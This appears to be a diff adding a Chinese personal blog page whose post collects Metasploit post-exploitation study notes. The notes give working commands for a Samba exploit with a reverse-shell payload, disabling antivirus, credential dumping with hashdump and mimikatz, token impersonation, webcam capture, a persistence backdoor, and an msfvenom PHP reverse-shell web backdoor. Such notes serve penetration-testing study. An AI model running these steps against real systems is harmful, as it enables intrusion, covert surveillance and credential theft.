@@ -1,0 +1,466 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="msf后渗透过程" />
+
+
+<meta name="description" content="最近学习后渗透和内网渗透，在此理清一下思路。
+msf模块
+Auxiliaries, 辅助模块，用于扫描主机、端口、嗅探和指纹识别等信息收集。
+Exploit，漏洞利用模块，针对一个存在的漏洞发起..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    msf后渗透过程 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="msf后渗透过程">
+            
+            msf后渗透过程
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/" rel="tag">msf后渗透过程</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/09/30</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>最近学习后渗透和内网渗透，在此理清一下思路。</p>
+<h2 id="msf模块"><a href="#msf模块" class="headerlink" title="msf模块"></a>msf模块</h2><ul>
+<li>Auxiliaries, 辅助模块，用于扫描主机、端口、嗅探和指纹识别等信息收集。</li>
+<li>Exploit，漏洞利用模块，针对一个存在的漏洞发起攻击的一段代码。</li>
+<li>payload，攻击载荷模块，用于目标系统被渗透攻击之后运行的代码。</li>
+<li>POST，后期渗透模块，渗透进内网后需要进行攻击所利用到的代码。</li>
+<li>Encoders, 编码模块，用于免杀。</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以直接利用db_nmap, 使用nmap的方式进行扫描。或者使用辅助模块。</p>
+<ul>
+<li><p>端口扫描：</p>
+<p><code>search portscan</code></p>
+<p><code>use auxiliary/scanner/portscan/tcp</code></p>
+<p>使用TCP扫描</p>
+<p><code>show options</code> -&gt; <code>set rhosts 主机地址</code> —&gt; <code>set ports 1-500</code> -&gt; run</p>
+</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用信息收集方式得到目标主机运行的服务后，尝试用exploit去攻击。比如知道了目标运行Samba服务，那么可以查找相应代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search samba</span><br><span class="line">use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse	&#x2F;&#x2F;设置payload</span><br><span class="line">set rhost xx</span><br><span class="line">set port 445</span><br><span class="line">set lhost 本地地址</span><br><span class="line">exploit 或者 run</span><br></pre></td></tr></table></figure>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p><code>ps</code></p>
+<p>获取目标主机运行的进程</p>
+<p><code>getpid</code></p>
+<p>获得当前渗透进目标的shell的进程号</p>
+<p><code>migrate xx</code></p>
+<p>找到一个进程号，迁移进去即可。</p>
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p><code>sysinfo</code></p>
+<p>查看系统信息</p>
+<p><code>run post/windows/gather/checkvm</code></p>
+<p>检测目标是否是虚拟机</p>
+<p><code>idletime</code></p>
+<p>检测目标运行时间</p>
+<p><code>route</code></p>
+<p>查看网络路由</p>
+<p><code>getuid</code></p>
+<p>查看当前登录的用户</p>
+<p><code>run post/windows/manage/killav</code></p>
+<p>关闭目标的杀毒软件</p>
+<p><code>run post/windows/manage/enable_rdp</code></p>
+<p>启动目标的远程桌面协议，之后打开另一个命令行，使用<code>rdesktop 目标地址</code>进行远程桌面连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute</span><br><span class="line">background</span><br><span class="line">route add xx.xx.xx.xx 255.255.255.0 1</span><br><span class="line">route print</span><br></pre></td></tr></table></figure>
+
+<p>添加一条路由</p>
+<p><code>run post/windows/gather/enum_logged_on_users</code></p>
+<p>列举当前有多少用户登录</p>
+<p><code>run post/windows/gather/enum_applications</code></p>
+<p>列举安装的应用程序</p>
+<p><code>run windows/gather/credentials/windows_autologin</code></p>
+<p>抓取自动登录的用户名和密码</p>
+<p><code>screenshot</code></p>
+<p>截图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  &#x2F;&#x2F;查看有无摄像头</span><br><span class="line">webcam_snap		&#x2F;&#x2F;打开摄像头</span><br><span class="line">webcam_stream	&#x2F;&#x2F;开启直播</span><br></pre></td></tr></table></figure>
+
+<p><code>shell</code></p>
+<p>进入命令行</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><code>pwd</code></p>
+<p>查看目标当前目录</p>
+<p><code>getlwd</code></p>
+<p>查看本机当前目录</p>
+<p><code>ls</code></p>
+<p>列出本机当前目录下的所有文件</p>
+<p><code>search -f *.txt -d c:\\</code></p>
+<p>搜索C盘下所有以TXT结尾的文件</p>
+<p><code>download c:\\test.txt /root</code></p>
+<p>下载目标的test.txt到本机的root目录下</p>
+<p><code>upload /root/test.txt c:\\</code></p>
+<p>将本机的test.txt上传到目标的C盘下。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell  进入命令行</span><br><span class="line">whoami &#x2F;groups	查看当前权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用溢出漏洞"><a href="#利用溢出漏洞" class="headerlink" title="利用溢出漏洞"></a>利用溢出漏洞</h4><p><code>getuid</code></p>
+<p>查看当前用户</p>
+<p>shell进入后，命令行中输入：</p>
+<p><code>systeminfo</code></p>
+<p>查看系统信息，查找目标打的补丁，然后在Exploit-DB和安全焦点上查找目标没有打的补丁，然后找到相应漏洞名称，search它，之后利用攻击即可。</p>
+<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>kerberos协议。假冒令牌。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">use incognito</span><br><span class="line">list_token -u</span><br><span class="line">查找到可利用的令牌即登录的用户名称</span><br><span class="line">impersonate_token WIN-57\\Administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><code>hashdump</code></p>
+<p>注意需要系统权限。</p>
+<p><code>run windows/gather/smart_hashdump</code></p>
+<p>绕过开启了UAC的Windows7.</p>
+<p>或者使用mimikatz（system权限）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">sysinfo</span><br><span class="line">load mimikatz</span><br><span class="line">msv		获取密码hash值</span><br><span class="line">kerberos  抓取系统票据</span><br><span class="line">wdigest  获取系统账户信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>使用persistence</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -A -S -U -i 60 -p 4321 -r 192.168.1.x</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>A: 字段启动payload</li>
+<li>S：系统启动时字段加载</li>
+<li>U:  用户登录时加载</li>
+<li>X：开机时启动</li>
+<li>i：发起连接的时间间隔</li>
+<li>P：监听反连的端口号</li>
+<li>r:  目标IP</li>
+</ul>
+<h4 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h4><p>使用msfvenom</p>
+<p>PHP:</p>
+<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=xx -f raw &gt; web.php</code></p>
+<p>上传PHP文件到网站后，启动msf，<code>use exploit/multi/handler</code>，然后设置lhost, payload，启动监听。</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/11/06/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/" class="pre-post btn btn-default" title='pwn入门-环境安装'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            pwn入门-环境安装</span>
+    </a>
+    
+    
+    <a href="/2020/09/25/BeautifulSoup%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="next-post btn btn-default" title='BeautifulSoup的简单使用'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            BeautifulSoup的简单使用</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#msf模块"><span class="toc-text">msf模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后渗透"><span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进程迁移"><span class="toc-text">进程迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统命令"><span class="toc-text">系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件操作"><span class="toc-text">文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用溢出漏洞"><span class="toc-text">利用溢出漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#令牌窃取"><span class="toc-text">令牌窃取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#抓取密码"><span class="toc-text">抓取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后门"><span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web后门"><span class="toc-text">Web后门</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
